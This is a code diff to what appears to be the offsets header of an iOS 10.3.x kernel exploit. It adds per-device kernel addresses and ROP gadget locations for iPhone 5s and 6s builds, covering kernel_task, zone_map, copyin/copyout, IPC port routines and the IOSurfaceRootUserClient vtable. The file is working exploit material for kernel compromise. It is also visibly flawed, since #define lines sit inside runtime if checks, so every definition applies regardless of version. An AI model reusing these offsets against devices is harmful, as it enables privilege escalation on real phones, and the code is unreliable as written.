@@ -37,23 +37,7 @@
 #define OFFSET_IOUSERCLIENT_IPC                     0x9c
 #define OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX     0x5b8
 
-if (strcmp(u.version, "Darwin Kernel Version 16.6.0: Mon Apr 17 17:33:34 PDT 2017; root:xnu-3789.60.24~24/RELEASE_ARM_S8000") == 0) //iPhone8,1 iOS 10.3.2
-{
-#define OFFSET_ZONE_MAP                             0xfffffff007548478
-#define OFFSET_KERNEL_MAP                           0xfffffff0075a4050
-#define OFFSET_KERNEL_TASK                          0xfffffff0075a4048
-#define OFFSET_REALHOST                             0xfffffff00752aba0
-#define OFFSET_BZERO                                0xfffffff007081f80
-#define OFFSET_BCOPY                                0xfffffff007081dc0
-#define OFFSET_COPYIN                               0xfffffff0071806f4
-#define OFFSET_COPYOUT                              0xfffffff0071808e8
-#define OFFSET_IPC_PORT_ALLOC_SPECIAL               0xfffffff007099e94
-#define OFFSET_IPC_KOBJECT_SET                      0xfffffff0070ad16c
-#define OFFSET_IPC_PORT_MAKE_SEND                   0xfffffff0070999b8
-#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006e7c9f8
-#define OFFSET_ROP_ADD_X0_X0_0x10                   0xfffffff0064b1398
-}
-if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:54 PST 2017; root:xnu-3789.52.2~7\/RELEASE_ARM64_S5L8960X") == 0) //iPhone 5s(iPhone6,1 and iPhone6,2) iOS 10.3.1
+if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:54 PST 2017; root:xnu-3789.52.2~7\/RELEASE_ARM64_S5L8960X") == 0) //iPhone5s iOS10.3.1
 {
 #define OFFSET_ZONE_MAP                             0xfffffff00754c478
 #define OFFSET_KERNEL_MAP                           0xfffffff0075a8050
@@ -68,6 +52,54 @@ if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:54 PST 201
 #define OFFSET_IPC_PORT_MAKE_SEND                   0xfffffff007099aa0
 #define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006f25538
 #define OFFSET_ROP_ADD_X0_X0_0x10                   0xfffffff006525174
+}
+if (strcmp(u.version, "Darwin Kernel Version 16.6.0: Mon Apr 17 17:33:34 PDT 2017; root:xnu-3789.60.24~24/RELEASE_ARM64_S5L8960X") == 0) //iPhone5s iOS10.3.2
+{
+#define OFFSET_ZONE_MAP                             0xfffffff00754c478
+#define OFFSET_KERNEL_MAP                           0xfffffff0075a8050
+#define OFFSET_KERNEL_TASK                          0xfffffff0075a8048
+#define OFFSET_REALHOST                             0xfffffff00752eba0
+#define OFFSET_BZERO                                0xfffffff007081f80
+#define OFFSET_BCOPY                                0xfffffff007081dc0
+#define OFFSET_COPYIN                               0xfffffff0071811ec
+#define OFFSET_COPYOUT                              0xfffffff0071813e0
+#define OFFSET_IPC_PORT_ALLOC_SPECIAL               0xfffffff007099f14
+#define OFFSET_IPC_KOBJECT_SET                      0xfffffff0070ad1ec
+#define OFFSET_IPC_PORT_MAKE_SEND                   0xfffffff007099a38
+#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006f25538
+#define OFFSET_ROP_ADD_X0_X0_0x10                   0xfffffff006526174
+}
+if (strcmp(u.version, "Darwin Kernel Version 16.7.0: Thu Jun 15 18:33:36 PDT 2017; root:xnu-3789.70.16~4/RELEASE_ARM64_S5L8960X") == 0) //iPhone5s iOS10.3.3
+{
+#define OFFSET_ZONE_MAP                             0xfffffff00754c478
+#define OFFSET_KERNEL_MAP                           0xfffffff0075a8050
+#define OFFSET_KERNEL_TASK                          0xfffffff0075a8048
+#define OFFSET_REALHOST                             0xfffffff00752eba0
+#define OFFSET_BZERO                                0xfffffff007081f80
+#define OFFSET_BCOPY                                0xfffffff007081dc0
+#define OFFSET_COPYIN                               0xfffffff007180e98
+#define OFFSET_COPYOUT                              0xfffffff00718108c
+#define OFFSET_IPC_PORT_ALLOC_SPECIAL               0xfffffff007099f14
+#define OFFSET_IPC_KOBJECT_SET                      0xfffffff0070ad1ec
+#define OFFSET_IPC_PORT_MAKE_SEND                   0xfffffff007099a38
+#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006f25538
+#define OFFSET_ROP_ADD_X0_X0_0x10                   0xfffffff006522174
+}
+if (strcmp(u.version, "Darwin Kernel Version 16.6.0: Mon Apr 17 17:33:34 PDT 2017; root:xnu-3789.60.24~24/RELEASE_ARM_S8000") == 0) //iPhone6s iOS10.3.2
+{
+#define OFFSET_ZONE_MAP                             0xfffffff007548478
+#define OFFSET_KERNEL_MAP                           0xfffffff0075a4050
+#define OFFSET_KERNEL_TASK                          0xfffffff0075a4048
+#define OFFSET_REALHOST                             0xfffffff00752aba0
+#define OFFSET_BZERO                                0xfffffff007081f80
+#define OFFSET_BCOPY                                0xfffffff007081dc0
+#define OFFSET_COPYIN                               0xfffffff0071806f4
+#define OFFSET_COPYOUT                              0xfffffff0071808e8
+#define OFFSET_IPC_PORT_ALLOC_SPECIAL               0xfffffff007099e94
+#define OFFSET_IPC_KOBJECT_SET                      0xfffffff0070ad16c
+#define OFFSET_IPC_PORT_MAKE_SEND                   0xfffffff0070999b8
+#define OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         0xfffffff006e7c9f8
+#define OFFSET_ROP_ADD_X0_X0_0x10                   0xfffffff006466174
 }
 
 const uint64_t IOSURFACE_CREATE_SURFACE =  0;
